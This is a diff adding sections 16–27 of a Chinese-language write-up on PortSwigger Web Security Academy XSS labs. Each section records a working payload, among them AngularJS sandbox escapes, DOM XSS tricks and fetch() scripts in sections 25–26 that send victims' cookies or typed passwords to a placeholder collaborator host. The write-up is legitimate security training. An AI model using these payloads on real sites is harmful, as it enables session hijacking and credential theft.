@@ -372,3 +372,213 @@ toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().construct
 1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
 ```
 
+#### 16. Reflected XSS with AngularJS sandbox escape and CSP
+
+[AngularJS沙箱](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox)
+
+[CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
+
+文章提示了可以使用`<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">`类似的东西来绕过。
+
+然后字符数超了。
+
+看了一下官方的paylaod：
+
+```html
+<script>
+location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+```
+
+好吧，我确实不会。
+
+`(z=alert)(document.cookie)`这一串直接看蒙，直呼666。
+
+这里是将`alert`赋值给`z`，然后用`z`去调用`document.cookie`，既避开了检查，又减少了字符数，简直米奇妙妙屋。
+
+#### 17. Stored XSS into HTML context with nothing encoded
+
+储存型XSS。
+
+题目上说，注入点在提交评论的地方。
+
+payload:`<script>alert(1)</script>`
+
+#### 18. DOM XSS in `document.write` sink using source `location.search`
+
+输入safe之后，发现：
+
+![18](XSS-hard.assets/18.png)
+
+应该只需要闭合然后随便弄一下就好了。
+
+payload:`safe" onload="alert(1)`
+
+这个我一开始用的是`onerror`但是发现不弹窗，应该是没有报错，于是选择`onload`。
+
+#### 19. DOM XSS in `document.write` sink using source `location.search` inside a select element
+
+注入点应该在`storeId`这里。
+
+![19.1](XSS-hard.assets/19.png)
+
+仔细观察源代码，发现漏洞。构造payload。
+
+`product?productId=2&storeId=xxxxx<script>alert(1)</script>`
+
+#### 20. DOM XSS in `innerHTML` sink using source `location.search`
+
+![20.1](XSS-hard.assets/20.1.png)
+
+虽然`<script>alert(1)</script>`已经输入进去了，但是没有弹窗，应该是没有触发。
+
+[解决办法](https://blog.csdn.net/qq_40424939/article/details/80651410)
+
+最终选择用`img`标签 ：`<img src="ssss.ss" onerror="alert(1)">`
+
+#### 21. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
+
+![21](XSS-hard.assets/21.png)
+
+这里是用JQuery定位了`backLink`，而这里的`href`是可控的，在url可以输入。
+
+但是这里双引号被实体编码了。
+
+所以我们使用`javascript:`
+
+payload:`/feedback?returnPath=javascript:alert(document.cookie)`
+
+#### 22. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
+
+> AngularJS is a popular JavaScript library, which scans the contents of HTML nodes **containing the `ng-app` attribute** (also known as an AngularJS directive). When a directive is added to the HTML code, you can **execute JavaScript expressions within double curly braces**. This technique is useful when angle brackets are being encoded.
+>
+> To solve this lab, perform a cross-site scripting attack that **executes an AngularJS expression** and calls the `alert` function.
+
+用双花括号可以执行js命令。
+
+![22](XSS-hard.assets/22.png)
+
+这里使用了ng标签。我们用双花括号去执行js命令。
+
+我弄不出来。
+
+去搜了一下。这里是[资料来源](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)。
+
+直接用上面的payload:`{{constructor.constructor('alert(1)')()}}`。
+
+#### 23. Reflected DOM XSS
+
+![23.1](XSS-hard.assets/23.1.png)
+
+这里可以看到是直接eval的。
+
+![23.2](XSS-hard.assets/23.2.png)
+
+这里用burp拦截了一下，发现这里返回了一个json。结合上面的eval函数，可以直接构造。
+
+先是尝试闭合引号。用`"sff`试了一下，发现返回了`{"searchTerm":"\"sff","results":[]}`。也就是说引号被转义了。
+
+这里尝试用`\`绕过转义。绕过成功。输入`\"sff`，得到：
+
+`{"searchTerm":"\\"sff","results":[]}`
+
+接下来构造alert()。
+
+payload：`\"};alert(1);//`
+
+返回的JSON是：`{"searchTerm":"\\"};alert(1);//","results":[]}`
+
+#### 24. Stored DOM XSS
+
+注入点在评论区。
+
+这个题目输入`</script>`会被吞掉。
+
+就算`<script>`注入成功了也不会运行，故采用`<img>`。
+
+而直接输入`<img src="ss.ss" onerror=alert(1)>`，发现尖括号被转换成了实体编码。
+
+可以在前面用一个`<xxx>`来避免他的一次转换。
+
+> 为了防止[XSS](https://portswigger.net/web-security/cross-site-scripting)，该网站使用JavaScript`replace()`函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一个匹配项。
+
+payload：`<><img src="ss.ss" onerror=alert(1)>`
+
+#### 25. Exploiting cross-site scripting to steal cookies
+
+这个题目在评论区是有一个非常明显的XSS漏洞的。
+
+题目要求：
+
+> A simulated victim user views all comments after they are **posted**. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.
+>
+> **NOTE:**
+>
+> To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you should use Burp Collaborator's default public server (`burpcollaborator.net`).
+
+也就是说这道题是要利用这个漏洞，将浏览评论的人的cookie用POST发送到自己的`burpcollaborator.net`上面来。
+
+使用`fetch`函数很方便。
+
+直接构造payload：
+
+```
+<script>
+	fetch('https://url', { 
+	method: 'POST',
+	body: document.cookie
+	});
+</script>
+```
+
+其中url就是`urpcollaborator.net`的地址。
+
+![25.1](XSS-hard.assets/25.1.png)
+
+这个时候已经可以收到发送来的东西了，但是不给过。
+
+然后对比官方给的payload：
+
+发现我少了一个`mode: 'no-cors',`。(但是我用官方的payload也不给过。)
+
+> `no-cors` — 保证请求对应的 method 只有 `HEAD`，`GET` 或 `POST` 方法，并且请求的 headers 只能有简单请求头 (simple headers)。如果 ServiceWorker 劫持了此类请求，除了simple header之外，不能添加或修改其他 header。另外 JavaScript 不会读取 Response 的任何属性。这样将会确保 ServiceWorker 不会影响 Web 语义(semantics of the Web)，同时保证了在跨域时不会发生安全和隐私泄露的问题。
+
+这里有一个[VIDEO](https://www.youtube.com/watch?v=zs1OsfL0z4o)。大概是我还差了一步。
+
+我要用管理员的cookie登录进去才行。
+
+因为你写了这个之后，他会给你发一个cookie，然后你要用这个cookie进去。
+
+![25.2](XSS-hard.assets/25.2.png)
+
+
+
+就这个，你需要用burp抓包，用这个session进去。
+
+#### 26. Exploiting cross-site scripting to capture passwords
+
+这次学聪明了，不仅要获得受害者的用户名和密码，还要用他们来登录。
+
+找了半天没看到用户名和密码在哪，然后去看了一下官方的payload：
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+好家伙，居然是要受害者输入的。
+
+`onchange`：输入框改变后触发。
+
+然后就是按照上面的题目依葫芦画瓢。
+
+然后将得到的帐号密码，在右上角靠下一点有个login，登录进去就可以了。
+
+#### 27. Exploiting XSS to perform CSRF
+
+![27.1](XSS-hard.assets/27.1.png)
+
